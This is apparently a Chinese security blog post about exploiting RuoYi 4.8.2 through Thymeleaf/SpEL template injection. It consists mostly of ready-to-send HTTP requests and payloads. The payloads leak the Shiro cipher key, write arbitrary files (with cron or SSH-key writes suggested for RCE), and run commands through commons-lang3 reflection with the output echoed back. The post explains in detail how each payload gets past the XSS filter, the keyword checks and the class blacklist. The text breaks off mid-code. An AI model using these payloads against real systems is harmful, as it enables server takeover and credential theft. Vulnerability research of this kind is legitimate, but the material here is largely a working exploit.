+<h3 id="获取shiroKey："><a href="#获取shiroKey：" class="headerlink" title="获取shiroKey："></a>获取shiroKey：</h3><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/monitor/cache/getNames</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>www.test.local:48200<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://www.test.local:48100/index<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>JSESSIONID=6fddd694-f7a5-4842-89ff-8da24adeb2f4<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><br><span class="language-routeros"><span class="hljs-attribute">fragment</span>=<span class="hljs-variable">$__</span>|&#123;#response.getWriter().<span class="hljs-built_in">print</span>(@securityManager.getClass().forName(<span class="hljs-string">&#x27;java.util.Base64&#x27;</span>).getMethod(<span class="hljs-string">&#x27;getEncoder&#x27;</span>).invoke(<span class="hljs-literal">null</span>).encodeToString(@securityManager.rememberMeManager.cipherKey))&#125;|__</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/./img/ruoyi4-8-2/image-20260513165211796.png" srcset="/img/loading.gif" lazyload alt="image-20260513165211796"></p>
+<h3 id="任意文件写："><a href="#任意文件写：" class="headerlink" title="任意文件写："></a>任意文件写：</h3><p>先看这篇文章：<a target="_blank" rel="noopener" href="https://vipentest.com/blog/cve-2026-40478-thymeleaf-ssti-sandbox-escape-rce/?srsltid=AfmBOopDaDsDtLm_OEbMi9rbBTSH9Jau-YJcfUERQ6RLia1tPK6lb82e#h-vulnerability-overview">https://vipentest.com/blog/cve-2026-40478-thymeleaf-ssti-sandbox-escape-rce/?srsltid=AfmBOopDaDsDtLm_OEbMi9rbBTSH9Jau-YJcfUERQ6RLia1tPK6lb82e#h-vulnerability-overview</a></p>
+<p><img src="/./img/ruoyi4-8-2/1778471225201-2600e642-d227-4a8a-afd6-4ebfe27dc010.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">$</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">new</span>\tcom.fasterxml.jackson.databind.ObjectMapper().createGenerator(<span class="hljs-name">new</span>\torg.springframework.core.io.FileSystemResource(<span class="hljs-name">&#x27;C:/Users/13664/Desktop/1.txt&#x27;</span>).getOutputStream())&#125;.![&#123;writeRaw(&#x27;file content&#x27;), close()&#125;]&#125;</span><br></code></pre></td></tr></table></figure>
+
+<p><strong>等价于如下java代码</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.fasterxml.jackson.core.JsonGenerator;<br><span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.ObjectMapper;<br><span class="hljs-keyword">import</span> org.springframework.core.io.FileSystemResource;<br><br><span class="hljs-keyword">import</span> java.io.OutputStream;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ObjectMapper</span> <span class="hljs-variable">objectMapper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectMapper</span>();<br><br>        <span class="hljs-type">FileSystemResource</span> <span class="hljs-variable">resource</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileSystemResource</span>(<span class="hljs-string">&quot;C:/Users/13664/Desktop/1.txt&quot;</span>);<br><br>        <span class="hljs-type">OutputStream</span> <span class="hljs-variable">outputStream</span> <span class="hljs-operator">=</span> resource.getOutputStream();<br><br>        <span class="hljs-type">JsonGenerator</span> <span class="hljs-variable">generator</span> <span class="hljs-operator">=</span> objectMapper.createGenerator(outputStream);  <span class="hljs-comment">//创建一个 JsonGenerator，把它生成/写出的内容输出到 outputStream 指向的地方</span><br><br>        generator.writeRaw(<span class="hljs-string">&quot;file content&quot;</span>); <span class="hljs-comment">//写入原始文本</span><br>        generator.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>最后的<code>![&#123;writeRaw(&#39;file content&#39;), close()&#125;]</code>是 SpEL 的<strong>投影&#x2F;链式调用写法</strong>，意图是在前面创建出来的 <strong><code>JsonGenerator</code></strong> 对象上依次调用：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">generator.writeRaw(&quot;file content&quot;);<br>generator.close();<br></code></pre></td></tr></table></figure>
+
+<p>但是直接用这个poc来测试若依是行不通的，报错会<code>at com.ruoyi.common.xss.XssFilter.doFilter(XssFilter.java:54)</code></p>
+<p>**为什么文章里的 **<code>%09</code>(TAB) 绕过法，在本地 Java 纯代码测试中能成，一上若依的 Web 环境就失效了？</p>
+<p>答案就是被若依的 <strong>XSS 过滤器（XssFilter）</strong> 给过滤了。</p>
+<p>文章作者构造 <code>%09</code> (TAB) 绕过的核心逻辑是基于一个解析差：</p>
+<ol>
+<li>Thymeleaf 的 <code>normalize()</code> 会<strong>删掉</strong> TAB，变成 <code>newcom...</code>，从而骗过扫描器（因为扫描器在找<code>new空格</code>）。</li>
+<li>Spring 的 SpEL 解析器会<strong>保留</strong> TAB，成功解析出 <code>new</code> 关键字。</li>
+</ol>
+<p>但是在若依的web环境中，当 HTTP 请求到达 Tomcat 后，首先经过了若依自带的 <code>XssFilter</code>。若依的 XSS 过滤器底层通常会使用 <code>Jsoup</code> 或类似工具对所有传入的参数进行“清理”。 在这个清理过程中，<strong>HTML 标签和空白字符会被规范化（Normalize Whitespace）</strong>。</p>
+<p>也就是说， <code>%09</code>（TAB），在经过 <code>XssFilter</code> 时，<strong>被强行转换成了一个普通的空格</strong>。</p>
+<p>这就导致了字符串进入 Thymeleaf 的 <code>normalize()</code> 方法后，因为普通空格的 ASCII 码是 <code>0x20</code>（不满足 <code>&lt; 0x20</code> 的删除条件），所以<strong>空格被保留了下来</strong>。然后扫描器检查字符串，精准地抓到了 <code>new空格 </code>，当场抛出异常拦截。</p>
+<p>所以这里只能打不用new关键字，依靠反射的payload：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/monitor/cache/getNames</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>www.test.local:48200<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://www.test.local:48100/index<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>JSESSIONID=2ba4a387-3be0-45fa-b7f3-f78cce757d5f<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><br><span class="language-handlebars"><span class="language-xml">fragment=$__|</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&#x27;&#x27;.getClass</span>().forName(<span class="hljs-name">&#x27;com.fasterxml.jackson.databind.ObjectMapper&#x27;</span>).newInstance().createGenerator(<span class="hljs-name">&#x27;&#x27;.getClass</span>().forName(<span class="hljs-name">&#x27;org.springframework.core.io.FileSystemResource&#x27;</span>).getConstructor(<span class="hljs-name">&#x27;&#x27;.getClass</span>()).newInstance(<span class="hljs-name">&#x27;C:/Users/13664/Desktop/1.txt&#x27;</span>).getOutputStream())&#125;.![&#123;writeRaw(&#x27;file content&#x27;),close()&#125;]&#125;|__</span></span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/./img/ruoyi4-8-2/1778477540504-60b1fe52-8480-4fac-9fe3-fed552248dde.png" srcset="/img/loading.gif" lazyload></p>
+<p>可以写定时任务<code>/etc/cron.d/</code>或者ssh公钥<code>~/.ssh/authorized_keys</code>来达到RCE的效果。</p>
+<h3 id="无回显RCE："><a href="#无回显RCE：" class="headerlink" title="无回显RCE："></a>无回显RCE：</h3><p>如果 Apache Commons Lang 3 (commons-lang3) 存在于类路径中（它是大约 80% 的 Spring Boot 应用程序中的传递依赖项），则可以使用更直接的代码执行路径。利用 <code>ClassUtils.getClass()</code> 和 <code>MethodUtils.invokeMethod()</code>，攻击者可以直接反射调用 <code>Runtime.exec()</code>。</p>
+<h4 id="组装反射调用链："><a href="#组装反射调用链：" class="headerlink" title="组装反射调用链："></a>组装反射调用链：</h4><p><strong>1. 获取 <strong><code>Runtime.class</code></strong>:</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">&#x27;&#x27;.getClass().forName(&#x27;java.lang.Runtime&#x27;)<br></code></pre></td></tr></table></figure>
+
+<p>**2. 实例化 **<code>MethodUtils</code> (用于后续调用):</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">&#x27;&#x27;.getClass().forName(&#x27;org.apache.commons.lang3.reflect.MethodUtils&#x27;).newInstance()<br></code></pre></td></tr></table></figure>
+
+<p>**3. 调用 **<code>getRuntime()</code> 获取 Runtime 实例 (invokeStaticMethod):</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">[MethodUtils实例].invokeStaticMethod([Runtime的Class对象], &#x27;getRuntime&#x27;)<br></code></pre></td></tr></table></figure>
+
+<p>**4. 调用 **<code>exec(&#39;calc&#39;)</code> 执行命令 (invokeMethod):</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">[MethodUtils实例].invokeMethod([Runtime实例], &#x27;exec&#x27;, &#x27;calc&#x27;)<br></code></pre></td></tr></table></figure>
+
+<p>将上面的逻辑嵌套组合在一起，最终的 Payload 如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">$__|&#123;&#123; &#x27;&#x27;.getClass().forName(&#x27;org.apache.commons.lang3.reflect.MethodUtils&#x27;).newInstance().invokeMethod(&#x27;&#x27;.getClass().forName(&#x27;org.apache.commons.lang3.reflect.MethodUtils&#x27;).newInstance().invokeStaticMethod(&#x27;&#x27;.getClass().forName(&#x27;java.lang.Runtime&#x27;),&#x27;getRuntime&#x27;),&#x27;exec&#x27;,&#x27;calc&#x27;)&#125;&#125;|__<br></code></pre></td></tr></table></figure>
+
+<ol>
+<li>**绕过第一层 (checkViewNameNotInRequest)**：利用 <code>$__|&#123;...&#125;|__</code>时间差成功欺骗检查器。</li>
+<li>**绕过第二层 (SpEL 关键字拦截)**：全文没有 <code>new</code>，没有 <code>T(</code>，没有 <code>%09</code>，不依赖任何特殊的空白字符，完美穿透 <code>XssFilter</code>。</li>
+<li><strong>绕过第三层 (</strong><code>ACL 黑名单</code>**)**：全程只显式调用了 <code>java.lang.String</code> (<code>&#39;&#39;</code>) 和 <code>org.apache.commons.lang3</code> 下的方法，成功把 <code>java.lang.Runtime</code> 的调用隐藏在了第三方工具类的内部。</li>
+<li><strong>无需写入权限</strong>：不像之前的 <code>ObjectMapper</code> 需要往磁盘写文件。</li>
+</ol>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/monitor/cache/getNames</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>www.test.local:48200<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://www.test.local:48200/index<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>JSESSIONID=8cc7d2e3-57e3-46c2-859b-11f88b1ce89d<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><br><span class="language-haxe">fragment=<span class="hljs-variable">$__</span>|&#123;</span><br><span class="language-haxe">    <span class="hljs-string">&#x27;&#x27;</span>.getClass().forName(<span class="hljs-string">&#x27;org.apache.commons.lang3.reflect.MethodUtils&#x27;</span>).<span class="hljs-keyword">new</span><span class="hljs-type">Instance</span>().invokeMethod(</span><br><span class="language-haxe">        <span class="hljs-string">&#x27;&#x27;</span>.getClass().forName(<span class="hljs-string">&#x27;org.apache.commons.lang3.reflect.MethodUtils&#x27;</span>).<span class="hljs-keyword">new</span><span class="hljs-type">Instance</span>().invokeStaticMethod(</span><br><span class="language-haxe">            <span class="hljs-string">&#x27;&#x27;</span>.getClass().forName(<span class="hljs-string">&#x27;java.lang.Runtime&#x27;</span>),</span><br><span class="language-haxe">            <span class="hljs-string">&#x27;getRuntime&#x27;</span></span><br><span class="language-haxe">        ),</span><br><span class="language-haxe">        <span class="hljs-string">&#x27;exec&#x27;</span>,</span><br><span class="language-haxe">        <span class="hljs-string">&#x27;calc&#x27;</span></span><br><span class="language-haxe">    )</span><br><span class="language-haxe">&#125;|__</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/./img/ruoyi4-8-2/1778579423995-54ded187-eebb-4eb5-a218-781bde5f6f3a.png" srcset="/img/loading.gif" lazyload></p>
+<p>其实可以用变量存对象，不用多层嵌套反射调用，我人傻了。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plain">$__|&#123;#response.getWriter().print(&#123;<br>#MethodUtils=&quot;&quot;.getClass().forName(&#x27;org.apache.commons.lang3.reflect.MethodUtils&#x27;).newInstance(),<br>#Rt_class=&quot;&quot;.getClass().forName(&#x27;java.lang.Runtime&#x27;),<br>#Rt_obj=#MethodUtils.invokeStaticMethod(#Rt_class,&#x27;getRuntime&#x27;),<br>#MethodUtils.invokeMethod(#Rt_obj,&#x27;exec&#x27;,&#x27;calc&#x27;)<br>&#125;)&#125;|__<br></code></pre></td></tr></table></figure>
+
+<p><img src="/./img/ruoyi4-8-2/1778643174809-cbb70169-7b00-4baa-9f67-d3a6d6754268.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="回显RCE："><a href="#回显RCE：" class="headerlink" title="回显RCE："></a>回显RCE：</h3><p>构造SPEL表达式，构造这种依靠反射的、冗长的poc，一定要按模块化。</p>
+<p><strong>网页端输出模块</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">__|$$&#123;#response.getWriter().print(……)&#125;|__<br></code></pre></td></tr></table></figure>
+
+<p><strong>Runtime命令执行模块</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plain">&#x27;&#x27;.getClass().forName(&#x27;org.apache.commons.lang3.reflect.MethodUtils&#x27;).newInstance().invokeMethod(<br>    &#x27;&#x27;.getClass().forName(&#x27;org.apache.commons.lang3.reflect.MethodUtils&#x27;).newInstance().invokeStaticMethod(<br>        &#x27;&#x27;.getClass().forName(&#x27;java.lang.Runtime&#x27;),<br>        &#x27;getRuntime&#x27;<br>    ),<br>    &#x27;exec&#x27;,<br>    &#x27;calc&#x27;<br>)<br></code></pre></td></tr></table></figure>
+
+<p><img src="/./img/ruoyi4-8-2/1778491189200-1990f0f3-4a91-4b22-8b41-12f4a87da63d.png" srcset="/img/loading.gif" lazyload></p>
+<p><strong>BufferedInputStream模块</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs plain">&#x27;&#x27;.getClass().forName(&quot;java.lang.Process&quot;).getMethod(&quot;getInputStream&quot;).invoke(<br>    &#x27;&#x27;.getClass().forName(&#x27;org.apache.commons.lang3.reflect.MethodUtils&#x27;).newInstance().invokeMethod(<br>            &#x27;&#x27;.getClass().forName(&#x27;org.apache.commons.lang3.reflect.MethodUtils&#x27;).newInstance().invokeStaticMethod(<br>                &#x27;&#x27;.getClass().forName(&#x27;java.lang.Runtime&#x27;),<br>                &#x27;getRuntime&#x27;<br>            ),<br>            &#x27;exec&#x27;,<br>            &#x27;calc&#x27;<br>    )<br>)<br></code></pre></td></tr></table></figure>
+
+<p><img src="/./img/ruoyi4-8-2/1778491253902-0cb95369-a1c1-4a6c-bc4f-d3c27373844e.png" srcset="/img/loading.gif" lazyload></p>
+<p><strong>注意：</strong>如果直接调用 <code>exec</code> 的 <code>getInputStream</code> 方法，会报错：<code>java.lang.reflect.InaccessibleObjectException: Unable to make public java.io.InputStream java.lang.ProcessImpl.getInputStream() accessible: module java.base does not &quot;opens java.lang&quot; to unnamed module @1e6a3214</code> </p>
+<p>这是 <strong>Java 强封装（Strong Encapsulation）</strong> 报错，通常出现在 <strong>Java 9 及更高版本（如 Java 11, 17, 21）</strong> 中。由于<strong>JDK 模块系统限制（JPMS）</strong>：从 Java 9 开始，JDK 引入了模块化系统。<code>java.base</code> 模块下的很多内部实现类（比如 <code>java.lang.ProcessImpl</code>，它是 <code>Process</code> 的具体实现）默认是不对外部开放反射权限的。<code>Runtime.exec()</code> 返回的对象虽然声明是 <code>java.lang.Process</code>（抽象类&#x2F;公共类），但其实际运行时的具体类是 <code>java.lang.ProcessImpl</code>。当你通过反射调用 <code>getInputStream()</code> 时，反射引擎尝试在 <code>ProcessImpl</code> 上查找该方法，由于 <code>ProcessImpl</code> 是 JDK 内部类，强封装机制禁止了这种跨模块的反射访问。  </p>
+<p><strong>解决方法：</strong>我们需要显式地告诉反射引擎，我们要调用的是公共父类 <code>java.lang.Process</code> 里的方法，而不是内部实现类 <code>ProcessImpl</code> 的方法。</p>
+<p>伪代码：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Process</span> <span class="hljs-variable">p</span> <span class="hljs-operator">=</span> Runtime.getRuntime().exec(<span class="hljs-string">&quot;whoami&quot;</span>);<br><span class="hljs-comment">// 关键：从公共类 Process 中获取 getInputStream 方法，而不是从实例 p 中获取类</span><br>java.lang.reflect.<span class="hljs-type">Method</span> <span class="hljs-variable">getIn</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;java.lang.Process&quot;</span>).getMethod(<span class="hljs-string">&quot;getInputStream&quot;</span>);<br><span class="hljs-comment">// 然后在 p 实例上调用这个公共方法</span><br><span class="hljs-type">InputStream</span> <span class="hljs-variable">is</span> <span class="hljs-operator">=</span> (InputStream) getIn.invoke(p);<br></code></pre></td></tr></table></figure>
+
+<p><strong>Scanner模块</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs plain">&#x27;&#x27;.getClass().forName(&#x27;org.apache.commons.lang3.reflect.MethodUtils&#x27;).newInstance().invokeMethod(<br>    &#x27;&#x27;.getClass().forName(&#x27;java.util.Scanner&#x27;).getConstructor(<br>        &#x27;&#x27;.getClass().forName(&#x27;java.io.InputStream&#x27;)<br>    ).newInstance(<br>        ………………<br>    ),<br>    &#x27;useDelimiter&#x27;,<br>    &#x27;\\A&#x27;<br>).next()<br></code></pre></td></tr></table></figure>
+
+<p>把以上模块结合，就得到了最终</p>
+<h4 id="poc："><a href="#poc：" class="headerlink" title="poc："></a>poc：</h4><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/monitor/cache/getNames</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>www.test.local:48200<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://www.test.local:48200/index<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>JSESSIONID=420ffcb3-9fc6-4218-b5a3-865f4eaa73ae<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><br><span class="language-haxe">fragment=__|<span class="hljs-variable">$$</span>&#123;<span class="hljs-meta">#response.getWriter().print(</span></span><br><span class="language-haxe">    <span class="hljs-string">&#x27;&#x27;</span>.getClass().forName(<span class="hljs-string">&#x27;org.apache.commons.lang3.reflect.MethodUtils&#x27;</span>).<span class="hljs-keyword">new</span><span class="hljs-type">Instance</span>().invokeMethod(</span><br><span class="language-haxe">        <span class="hljs-string">&#x27;&#x27;</span>.getClass().forName(<span class="hljs-string">&#x27;java.util.Scanner&#x27;</span>).getConstructor(</span><br><span class="language-haxe">            <span class="hljs-string">&#x27;&#x27;</span>.getClass().forName(<span class="hljs-string">&#x27;java.io.InputStream&#x27;</span>)</span><br><span class="language-haxe">        ).<span class="hljs-keyword">new</span><span class="hljs-type">Instance</span>(</span><br><span class="language-haxe">            <span class="hljs-string">&#x27;&#x27;</span>.getClass().forName(<span class="hljs-string">&quot;java.lang.Process&quot;</span>).getMethod(<span class="hljs-string">&quot;getInputStream&quot;</span>).invoke(</span><br><span class="language-haxe">                <span class="hljs-string">&#x27;&#x27;</span>.getClass().forName(<span class="hljs-string">&#x27;org.apache.commons.lang3.reflect.MethodUtils&#x27;</span>).<span class="hljs-keyword">new</span><span class="hljs-type">Instance</span>().invokeMethod(</span><br><span class="language-haxe">                        <span class="hljs-string">&#x27;&#x27;</span>.getClass().forName(<span class="hljs-string">&#x27;org.apache.commons.lang3.reflect.MethodUtils&#x27;</span>).<span class="hljs-keyword">new</span><span class="hljs-type">Instance</span>().invokeStaticMethod(</span><br><span class="language-haxe">                            <span class="hljs-string">&#x27;&#x27;</span>.getClass().forName(<span class="hljs-string">&#x27;java.lang.Runtime&#x27;</span>),</span><br><span class="language-haxe">                            <span class="hljs-string">&#x27;getRuntime&#x27;</span></span><br><span class="language-haxe">                        ),</span><br><span class="language-haxe">                        <span class="hljs-string">&#x27;exec&#x27;</span>,</span><br><span class="language-haxe">                        <span class="hljs-string">&#x27;whoami&#x27;</span></span><br><span class="language-haxe">                )</span><br><span class="language-haxe">            )</span><br><span class="language-haxe">        ),</span><br><span class="language-haxe">        <span class="hljs-string">&#x27;useDelimiter&#x27;</span>,</span><br><span class="language-haxe">        <span class="hljs-string">&#x27;\\A&#x27;</span></span><br><span class="language-haxe">    ).next()</span><br><span class="language-haxe">)&#125;|__</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/./img/ruoyi4-8-2/1778490987564-32d11fd0-0c06-4314-b650-cc4ce4278508.png" srcset="/img/loading.gif" lazyload></p>
+<p>poc展开后得到java代码：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs java"><span 